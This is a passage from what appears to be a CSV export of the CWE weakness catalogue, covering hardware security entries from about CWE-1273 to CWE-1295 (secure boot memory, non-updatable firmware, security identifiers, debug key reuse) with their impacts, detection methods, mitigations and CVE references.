employed by yet a third company. Since these different companies will need to perform various tests on the device to verify correct device function, they all need to share the unlock key. Unfortunately, the level of secrecy and policy might be quite different at each company, greatly increasing the risk of sensitive credentials being compromised.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Compiled:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Other:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Integration::PHASE:Manufacturing::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Modify Files or Directories:IMPACT:Read Files or Directories:IMPACT:Modify Application Data:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:NOTE:Once unlock credentials are compromised, an attacker can use the credentials to unlock the device and gain unauthorized access to the hidden functionalities protected by those credentials.::\",\"\",\"::PHASE:Integration:DESCRIPTION:Ensure the unlock credentials are shared with the minimum number of parties and with utmost secrecy. To limit the risk associated with compromised credentials, where possible, the credentials should be part-specific.::PHASE:Manufacturing:DESCRIPTION:Ensure the unlock credentials are shared with the minimum number of parties and with utmost secrecy. To limit the risk associated with compromised credentials, where possible, the credentials should be part-specific.::\",\"\",,,\"\",::560::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1274,\"Improper Access Control for Volatile Memory Containing Boot Code\",Base,Stable,\"The product conducts a secure-boot process that transfers bootloader code from Non-Volatile Memory (NVM) into Volatile Memory (VM), but it does not have sufficient access control or other protections for the Volatile Memory.\",\"Adversaries could bypass the secure-boot process and execute their own untrusted, malicious boot code. As a part of a secure-boot process, the read-only-memory (ROM) code for a System-on-Chip (SoC) or other system fetches bootloader code from Non-Volatile Memory (NVM) and stores the code in Volatile Memory (VM), such as dynamic, random-access memory (DRAM) or static, random-access memory (SRAM). The NVM is usually external to the SoC, while the VM is internal to the SoC. As the code is transferred from NVM to VM, it is authenticated by the SoC's ROM code. If the volatile-memory-region protections or access controls are insufficient to prevent modifications from an adversary or untrusted agent, the secure boot may be bypassed or replaced with the execution of an adversary's code.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:This weakness can be introduced during hardware architecture or design but can be identified later during testing.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:LIKELIHOOD:High::\",\"::METHOD:Manual Analysis:DESCRIPTION:Ensure the volatile memory is lockable or has locks. Ensure the volatile memory is locked for writes from untrusted agents or adversaries. Try modifying the volatile memory from an untrusted agent, and ensure these writes are dropped.:EFFECTIVENESS:High::METHOD:Manual Analysis:DESCRIPTION:Analyze the device using the following steps: Identify all fabric master agents that are active during system Boot Flow when initial code is loaded from Non-volatile storage to volatile memory. Identify the volatile memory regions that are used for storing loaded system executable program. During system boot, test programming the identified memory regions in step 2 from all the masters identified in step 1. Only trusted masters should be allowed to write to the memory regions. For example, pluggable device peripherals should not have write access to program load memory regions.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:DESCRIPTION:Ensure that the design of volatile-memory protections is enough to prevent modification from an adversary or untrusted code.::PHASE:Testing:DESCRIPTION:Test the volatile-memory protections to ensure they are safe from modification or untrusted code.::\",\"::REFERENCE:CVE-2019-2267:DESCRIPTION:Locked memory regions may be modified through other interfaces in a secure-boot-loader image due to improper access control.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-2267::\",,,\"\",::456::679::,\"\",\n1276,\"Hardware Child Block Incorrectly Connected to Parent System\",Base,Incomplete,\"Signals between a hardware IP and the parent system design are incorrectly connected causing security risks.\",\"Individual hardware IP must communicate with the parent system in order for the product to function correctly and as intended. If implemented incorrectly, while not causing any apparent functional issues, may cause security issues. For example, if the IP should only be reset by a system-wide hard reset, but instead the reset input is connected to a software-triggered debug mode reset (which is also asserted during a hard reset), integrity of data inside the IP can be violated.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:This weakness is introduced when integrating IP into a parent design.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:System-level verification may be used to ensure that components are correctly connected and that design security requirements are not violated due to interactions between various IP blocks.::\",\"\",,,\"\",,\"\",\n1277,\"Firmware Not Updateable\",Base,Draft,\"The product does not provide its users with the ability to update or patch its firmware to address any vulnerabilities or weaknesses that may be present.\",\"Without the ability to patch or update firmware, consumers will be left vulnerable to exploitation of any known vulnerabilities, or any vulnerabilities that are discovered in the future. This can expose consumers to permanent risk throughout the entire lifetime of the device, which could be years or decades. Some external protective measures and mitigations might be employed to aid in preventing or reducing the risk of malicious attack, but the root weakness cannot be corrected.\",::NATURE:ChildOf:CWE ID:1329:VIEW ID:1000:ORDINAL:Primary::,\"::ORDINALITY:Primary::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Requirements:NOTE:Requirements development might not consider the importance of updates over the lifetime of the product, or might not choose the ability due to concerns such as expense or speed to market.::PHASE:Architecture and Design:NOTE:Lack of planning during architecture development and design, or external pressures such as speed to market, could ignore the capability to update.::PHASE:Implementation:NOTE:The weakness can appear through oversight during implementation.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Access Control:SCOPE:Authentication:SCOPE:Authorization:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:IMPACT:Execute Unauthorized Code or Commands:IMPACT:DoS: Crash, Exit, or Restart:LIKELIHOOD:Medium:NOTE:If an attacker can identify an exploitable vulnerability in one device that has no means of patching, the attack may be used against an entire class of devices.::\",\"::METHOD:Manual Analysis:DESCRIPTION:Create a new installable boot image of the current build with a minor version number change. Use the standard installation method to update the boot image. Verify that the minor version number has changed. Create a fake image. Verify that the boot updater will not install the fake image and generates an invalid image error message or equivalent.:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:Check the consumer or maintainer documentation, the architecture/design documentation, or the original requirements to ensure that the documentation includes details for how to update the firmware.:EFFECTIVENESS:Moderate::METHOD:Manual Dynamic Analysis:DESCRIPTION:Determine if there is a lack of a capability to update read-only memory (ROM) structure. This could manifest as a difference between the latest firmware version and the current version within the device.:EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Specify requirements to include the ability to update the firmware. Include integrity checks and authentication to ensure that untrusted firmware cannot be installed.::PHASE:Architecture and Design:DESCRIPTION:Design the device to allow for updating the firmware. Ensure that the design specifies how to distribute the updates and ensure their integrity and authentication.::PHASE:Implementation:DESCRIPTION:Implement the necessary functionality to allow the firmware to be updated.::\",\"::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: network-attached storage (NAS) device has a critical OS command injection (CWE-78) vulnerability that is actively exploited to place IoT devices into a botnet, but some products are end-of-support and cannot be patched (CWE-1277). [REF-1097]:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:[REF-1095]:DESCRIPTION:A hardware smart lock has weak key generation that allows attackers to steal the key by BLE sniffing, but the device's firmware cannot be upgraded and hence remains vulnerable [REF-1095].:LINK:https://www.theregister.com/2019/12/11/f_secure_keywe/::\",,,\"\",::682::,\"::TYPE:Terminology:NOTE:The firmware term does not have a single commonly-shared definition, so there may be variations in how this CWE entry is interpreted during mapping.::\",\n1278,\"Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\",Base,Incomplete,\"Information stored in hardware may be recovered by an attacker with the capability to capture and analyze images of the integrated circuit using techniques such as scanning electron microscopy.\",\"The physical structure of a device, viewed at high enough magnification, can reveal the information stored inside. Typical steps in IC reverse engineering involve removing the chip packaging (decapsulation) then using various imaging techniques ranging from high resolution x-ray microscopy to invasive techniques involving removing IC layers and imaging each layer using a scanning electron microscope. The goal of such activities is to recover secret keys, unique device identifiers, and proprietary code and circuit designs embedded in hardware that the attacker has been unsuccessful at accessing through other means. These secrets may be stored in non-volatile memory or in the circuit netlist. Memory technologies such as masked ROM allow easier to extraction of secrets than One-time Programmable (OTP) memory.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Varies by Context:NOTE:A common goal of malicious actors who reverse engineer ICs is to produce and sell counterfeit versions of the IC.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:The cost of secret extraction via IC reverse engineering should outweigh the potential value of the secrets being extracted. Threat model and value of secrets should be used to choose the technology used to safeguard those secrets. Examples include IC camouflaging and obfuscation, tamper-proof packaging, active shielding, and physical tampering detection information erasure.::\",\"\",,,\"\",::188::37::545::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements. It is more attack-oriented, so it might be more suited for CAPEC.::\",\n1279,\"Cryptographic Operations are run Before Supporting Units are Ready\",Base,Incomplete,\"Performing cryptographic operations without ensuring that the supporting inputs are ready to supply valid data may compromise the cryptographic result.\",\"Many cryptographic hardware units depend upon other hardware units to supply information to them to produce a securely encrypted result. For example, a cryptographic unit that depends on an external random-number-generator (RNG) unit for entropy must wait until the RNG unit is producing random numbers. If a cryptographic unit retrieves a private encryption key from a fuse unit, the fuse unit must be up and running before a key may be supplied.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:665:VIEW ID:1000::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:The decision to continue using a cryptographic unit even though the input units to it are not producing valid data will compromise the encrypted result.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:IMPACT:Varies by Context::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Best practices should be used to design cryptographic systems.::PHASE:Implementation:DESCRIPTION:Continuously ensuring that cryptographic inputs are supplying valid information is necessary to ensure that the encrypted output is secure.::\",\"\",,,\"\",::97::,\"\",\n1280,\"Access Control Check Implemented After Asset is Accessed\",Base,Incomplete,\"A product's hardware-based access control check occurs after the asset has been accessed.\",\"The product implements a hardware-based access control check. The asset should be accessible only after the check is successful. If, however, this operation is not atomic and the asset is accessed before the check is complete, the security of the system may be compromised.\",::NATURE:ChildOf:CWE ID:696:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:284:VIEW ID:1000::,\"\",::LANGUAGE NAME:Verilog:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:VHDL:LANGUAGE PREVALENCE:Undetermined::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Access Control:SCOPE:Confidentiality:SCOPE:Integrity:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:Modify Application Data:IMPACT:Read Application Data:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Implement the access control check first. Access should only be given to asset if agent is authorized.::\",\"\",,,\"\",::180::,\"\",\n1281,\"Sequence of Processor Instructions Leads to Unexpected Behavior\",Base,Incomplete,\"Specific combinations of processor instructions lead to undesirable behavior such as locking the processor until a hard reset performed.\",\"If the instruction set architecture (ISA) and processor logic are not designed carefully and tested thoroughly, certain combinations of instructions may lead to locking the processor or other unexpected and undesirable behavior. Upon encountering unimplemented instruction opcodes or illegal instruction operands, the processor should throw an exception and carry on without negatively impacting security. However, specific combinations of legal and illegal instructions may cause unexpected behavior with security implications such as allowing unprivileged programs to completely lock the CPU.\",::NATURE:ChildOf:CWE ID:691:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Processor Hardware:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Unexpected behavior from certain instruction combinations can arise from bugs in the ISA::PHASE:Implementation:NOTE:Unexpected behavior from certain instruction combinations can arise because of implementation details such as speculative execution, caching etc.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Availability:IMPACT:Varies by Context::\",\"\",\"::PHASE:Testing:DESCRIPTION:Implement a rigorous testing strategy that incorporates randomization to explore instruction sequences that are unlikely to appear in normal workloads in order to identify halt and catch fire instruction sequences.::PHASE:Patching and Maintenance:DESCRIPTION:Patch operating system to avoid running Halt and Catch Fire type sequences or to mitigate the damage caused by unexpected behavior. See [REF-1108].::\",\"::REFERENCE:CVE-2021-26339:DESCRIPTION:A bug in AMD CPU's core logic allows a potential DoS by using a specific x86 instruction sequence to hang the processor:LINK:https://www.cve.org/CVERecord?id=CVE-2021-26339::REFERENCE:CVE-1999-1476:DESCRIPTION:A bug in some Intel Pentium processors allow DoS (hang) via an invalid CMPXCHG8B instruction, causing a deadlock:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1476::\",,,\"\",::212::,\"\",\n1282,\"Assumed-Immutable Data is Stored in Writable Memory\",Base,Incomplete,\"Immutable data, such as a first-stage bootloader, device identifiers, and write-once configuration settings are stored in writable memory that can be re-programmed or updated in the field.\",\"Security services such as secure boot, authentication of code and data, and device attestation all require assets such as the first stage bootloader, public keys, golden hash digests, etc. which are implicitly trusted. Storing these assets in read-only memory (ROM), fuses, or one-time programmable (OTP) memory provides strong integrity guarantees and provides a root of trust for securing the rest of the system. Security is lost if assets assumed to be immutable can be modified.\",::NATURE:ChildOf:CWE ID:668:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:471:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation:NOTE:Keys, code, configuration settings, and other data should be programmed in write-once or read-only memory instead of writable memory.::\",\"\",,\"::SCOPE:Integrity:IMPACT:Varies by Context::\",\"\",\"::PHASE:Implementation:DESCRIPTION:All immutable code or data should be programmed into ROM or write-once memory.::\",\"\",,,\"\",::458::679::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::TYPE:Maintenance:NOTE:As of CWE 4.3, CWE-1282 and CWE-1233 are being investigated for potential duplication or overlap.::\",\n1283,\"Mutable Attestation or Measurement Reporting Data\",Base,Incomplete,\"The register contents used for attestation or measurement reporting data to verify boot flow are modifiable by an adversary.\",\"A System-on-Chip (SoC) implements secure boot or verified boot. During this boot flow, the SoC often measures the code that it authenticates. The measurement is usually done by calculating the one-way hash of the code binary and extending it to the previous hash. The hashing algorithm should be a Secure One-Way hash function. The final hash, i.e., the value obtained after the completion of the boot flow, serves as the measurement data used in reporting or in attestation. The calculated hash is often stored in registers that can later be read by the party of interest to determine tampering of the boot flow. A common weakness is that the contents in these registers are modifiable by an adversary, thus spoofing the measurement.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues can be introduced during hardware architecture or design and can be identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:If the access-controls which protecting the reporting registers are misconfigured during implementation, this weakness can arise.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Memory:IMPACT:Read Application Data::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Measurement data should be stored in registers that are read-only or otherwise have access controls that prevent modification by an untrusted agent.::\",\"\",,,\"\",::680::,\"::TYPE:Maintenance:NOTE:This entry is still in development and will continue to see updates and content improvements.::\",\n1290,\"Incorrect Decoding of Security Identifiers \",Base,Incomplete,\"The product implements a decoding mechanism to decode certain bus-transaction signals to security identifiers. If the decoding is implemented incorrectly, then untrusted agents can now gain unauthorized access to the asset.\",\"In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity). Sometimes the transactions are qualified with a security identifier. The security identifier helps the destination agent decide on the set of allowed actions (e.g., access an asset for read and writes). A decoder decodes the bus transactions to map security identifiers into necessary access-controls/protections. A common weakness that can exist in this scenario is incorrect decoding because an untrusted agent's security identifier is decoded into a trusted agent's security identifier. Thus, an untrusted agent previously without access to an asset can now gain access to the asset.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1294:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Bus/Interface Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Quality Degradation:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Security identifier decoders must be reviewed for design consistency and common weaknesses.::PHASE:Implementation:DESCRIPTION:Access and programming flows must be tested in pre-silicon and post-silicon testing in order to check for this weakness.::\",\"\",,,\"\",,\"\",\n1291,\"Public Key Re-Use for Signing both Debug and Production Code\",Base,Draft,\"The same public key is used for signing both debug and production code.\",\"A common usage of public-key cryptography is to verify the integrity and authenticity of another entity (for example a firmware binary). If a company wants to ensure that its firmware runs only on its own hardware, before the firmware runs, an encrypted hash of the firmware image will be decrypted with the public key and then verified against the now-computed hash of the firmware image. This means that the public key forms the root of trust, which necessitates that the public key itself must be protected and used properly. During the development phase, debug firmware enables many hardware debug hooks, debug modes, and debug messages for testing. Those debug facilities provide significant, additional views about the firmware's capability and, in some cases, additional capability into the chip or SoC. If compromised, these capabilities could be exploited by an attacker to take full control of the system. Once the product exits the manufacturing stage and enters production, it is good practice to use a different public key. Debug firmware images are known to leak. With the debug key being reused as the production key, the debug image will also work on the production image. Thus, it will open all the internal, debug capabilities to the attacker. If a different public key is used for the production image, even if the attacker gains access to the debug firmware image, they will not be able to run it on a production machine. Thus, damage will be limited to the intellectual property leakage resulting from the debug image.\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:321:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Read Memory:IMPACT:Modify Memory:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:LIKELIHOOD:High::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Compare the debug key with the production key to make sure that they are not the same.:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:Compare the debug key with the production key to make sure that they are not the same.:EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:Use different keys for Production and Debug::\",\"\",,,\"\",,\"\",\n1292,\"Incorrect Conversion of Security Identifiers\",Base,Draft,\"The product implements a conversion mechanism to map certain bus-transaction signals to security identifiers. However, if the conversion is incorrectly implemented, untrusted agents can gain unauthorized access to the asset.\",\"In a System-On-Chip (SoC), various integrated circuits and hardware engines generate transactions such as to access (reads/writes) assets or perform certain actions (e.g., reset, fetch, compute, etc.). Among various types of message information, a typical transaction is comprised of source identity (to identify the originator of the transaction) and a destination identity (to route the transaction to the respective entity). Sometimes the transactions are qualified with a security identifier. This security identifier helps the destination agent decide on the set of allowed actions (e.g., access an asset for read and writes). A typical bus connects several leader and follower agents. Some follower agents implement bus protocols differently from leader agents. A protocol conversion happens at a bridge to seamlessly connect different protocols on the bus. One example is a system that implements a leader with the Advanced High-performance Bus (AHB) protocol and a follower with the Open-Core Protocol (OCP). A bridge AHB-to-OCP is needed to translate the transaction from one form to the other. A common weakness that can exist in this scenario is that this conversion between protocols is implemented incorrectly, whereupon an untrusted agent may gain unauthorized access to an asset.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:1294:VIEW ID:1194:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Bus/Interface Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design, then identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during hardware implementation, then identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Quality Degradation:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Security identifier decoders must be reviewed for design inconsistency and common weaknesses.::PHASE:Implementation:DESCRIPTION:Access and programming flows must be tested in pre-silicon and post-silicon testing.::\",\"\",,,\"\",,\"\",\n1294,\"Insecure Security Identifier Mechanism\",Class,Incomplete,\"The System-on-Chip (SoC) implements a Security Identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, the Security Identifiers are not correctly implemented.\",\"Systems-On-Chip (Integrated circuits and hardware engines) implement Security Identifiers to differentiate/identify actions originated from various agents. These actions could be 'read', 'write', 'program', 'reset', 'fetch', 'compute', etc. Security identifiers are generated and assigned to every agent in the System (SoC) that is either capable of generating an action or receiving an action from another agent. Every agent could be assigned a unique, Security Identifier based on its trust level or privileges. A broad class of flaws can exist in the Security Identifier process, including but not limited to missing security identifiers, improper conversion of security identifiers, incorrect generation of security identifiers, etc.\",::NATURE:ChildOf:CWE ID:284:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not OS-Specific:OPERATING SYSTEM PREVALENCE:Undetermined::ARCHITECTURE CLASS:Not Architecture-Specific:ARCHITECTURE PREVALENCE:Undetermined::TECHNOLOGY NAME:Bus/Interface Hardware:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Not Technology-Specific:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:Such issues could be introduced during hardware architecture and design, then identified later during Testing or System Configuration phases.::PHASE:Implementation:NOTE:Such issues could be introduced during hardware implementation, then identified later during Testing or System Configuration phases.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Modify Memory:IMPACT:Read Memory:IMPACT:DoS: Resource Consumption (Other):IMPACT:Execute Unauthorized Code or Commands:IMPACT:Gain Privileges or Assume Identity:IMPACT:Quality Degradation:LIKELIHOOD:High::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Security Identifier Decoders must be reviewed for design inconsistency and common weaknesses.::PHASE:Implementation:DESCRIPTION:Access and programming flows must be tested in pre-silicon and post-silicon testing.::\",\"\",,,\"\",::121::681::,\"::TYPE:Maintenance:NOTE:This entry is still under development and will continue to see updates and content improvements.::\",\n1295,\"Debug Messages Revealing Unnecessary Information\",Base,Incomplete,\"The product fails to adequately prevent the revealing of unnecessary and potentially sensitive system information within debugging messages.\",\"Debug messages are messages that help troubleshoot an issue by revealing the internal state of the system. For example, debug data in design can be exposed through internal memory array dumps or boot logs through interfaces like UART via TAP commands, scan chain, etc. Thus, the more information contained in a debug message, the easier it is to debug. However, there is also the risk of revealing information that could help an attacker either decipher a vulnerability, and/or gain a better understanding of the system. Thus, this extra information could lower the security by obscurity factor. While security by obscurity alone is insufficient, it can help as a part of Defense-in-depth.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:209:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::OPERATING SYSTEM CLASS:Not 